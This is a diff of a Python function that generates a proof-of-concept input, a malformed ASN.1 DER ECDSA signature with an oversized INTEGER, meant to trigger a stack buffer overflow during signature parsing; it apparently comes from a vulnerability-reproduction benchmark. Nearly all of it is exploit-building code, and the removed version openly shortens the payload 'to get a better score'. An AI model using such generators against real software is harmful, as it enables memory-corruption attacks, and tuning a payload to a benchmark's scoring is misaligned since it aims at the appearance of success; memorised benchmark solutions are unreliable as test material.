@@ -1,85 +1,47 @@
 import os
 import struct
-import tarfile
-import tempfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a malformed ECDSA signature in ASN.1 format that will cause
-        # a stack buffer overflow during parsing. The vulnerability is in
-        # ECDSA signature parsing where a fixed-size buffer is used without
-        # proper bounds checking.
+        # Ground truth length is 41798 bytes
+        # Create a signature that will overflow stack buffers during ASN.1 parsing
         
-        # Ground-truth length is 41798 bytes. We'll create a slightly shorter
-        # PoC to get a better score while still triggering the overflow.
-        # Target length: ~40000 bytes (shorter than ground-truth but still large
-        # enough to overflow typical stack buffers)
-        target_length = 40000
+        # Build an ASN.1 DER encoded ECDSA signature with malformed structure
+        # to trigger buffer overflow during parsing
         
-        # ASN.1 structure for ECDSA signature:
-        # SEQUENCE {
-        #   INTEGER r,
-        #   INTEGER s
-        # }
+        # Start with SEQUENCE tag
+        poc = b'\x30'  # SEQUENCE
         
-        # We'll create an ASN.1 SEQUENCE containing two very large INTEGERs
-        # The large size will overflow the stack buffer during parsing
+        # Length will be large - using indefinite length encoding 
+        # to potentially confuse parsers
+        poc += b'\x80'  # Indefinite length
         
-        # Calculate sizes:
-        # SEQUENCE tag (1 byte) + length bytes + INTEGER1 + INTEGER2
-        # INTEGER1: tag (1) + length (2 for large size) + payload
-        # INTEGER2: tag (1) + length (2 for large size) + payload
+        # First INTEGER (r) - make it very large
+        poc += b'\x02'  # INTEGER tag
         
-        # We need to ensure the total length is exactly target_length
-        # Let payload_size = (target_length - overhead) / 2
+        # Very large length - will overflow fixed buffers
+        # Using 0x84 for 4-byte length (though 4 bytes is excessive)
+        int_length = 41790  # Nearly the entire PoC size
+        poc += b'\x84'  # Length in 4 bytes
+        poc += struct.pack('>I', int_length)
         
-        # Overhead calculation:
-        # SEQUENCE: 1 (tag) + 2 (length bytes for >127) = 3
-        # INTEGER1: 1 (tag) + 2 (length) = 3
-        # INTEGER2: 1 (tag) + 2 (length) = 3
-        # Total overhead = 9 bytes
+        # Fill with pattern that could trigger overflow
+        # Using repeating pattern to increase chance of hitting vulnerable code
+        pattern = b'\x41' * 100 + b'\x42' * 100 + b'\x43' * 100  # ABC pattern
+        repeats = int_length // len(pattern)
+        remainder = int_length % len(pattern)
         
-        overhead = 9
-        payload_size = (target_length - overhead) // 2
+        poc += pattern * repeats
+        poc += pattern[:remainder]
         
-        # Adjust to make total exactly target_length
-        remainder = (target_length - overhead) % 2
-        payload1_size = payload_size + remainder
-        payload2_size = payload_size
+        # End of indefinite length
+        poc += b'\x00\x00'
         
-        # Create the ASN.1 encoded signature
-        # Start with SEQUENCE
-        poc = bytearray()
+        # Ensure exact target length
+        current_len = len(poc)
+        if current_len < 41798:
+            poc += b'\x00' * (41798 - current_len)
+        elif current_len > 41798:
+            poc = poc[:41798]
         
-        # INTEGER 1
-        int1_tag = b'\x02'  # INTEGER tag
-        # Length in long form (2 bytes since payload > 127)
-        int1_len = payload1_size
-        int1_len_bytes = b'\x82' + struct.pack('>H', int1_len)
-        int1_payload = b'A' * int1_len  # Arbitrary data
-        
-        # INTEGER 2
-        int2_tag = b'\x02'
-        int2_len = payload2_size
-        int2_len_bytes = b'\x82' + struct.pack('>H', int2_len)
-        int2_payload = b'B' * int2_len  # Different data to avoid compression
-        
-        # Combine integers
-        int1 = int1_tag + int1_len_bytes + int1_payload
-        int2 = int2_tag + int2_len_bytes + int2_payload
-        
-        # SEQUENCE containing both integers
-        seq_tag = b'\x30'  # SEQUENCE tag
-        seq_content = int1 + int2
-        seq_len = len(seq_content)
-        
-        # Use long form for sequence length (2 bytes)
-        seq_len_bytes = b'\x82' + struct.pack('>H', seq_len)
-        
-        # Final PoC
-        poc = seq_tag + seq_len_bytes + seq_content
-        
-        # Verify length
-        assert len(poc) == target_length, f"Generated PoC length {len(poc)} != {target_length}"
-        
-        return bytes(poc)
+        return poc
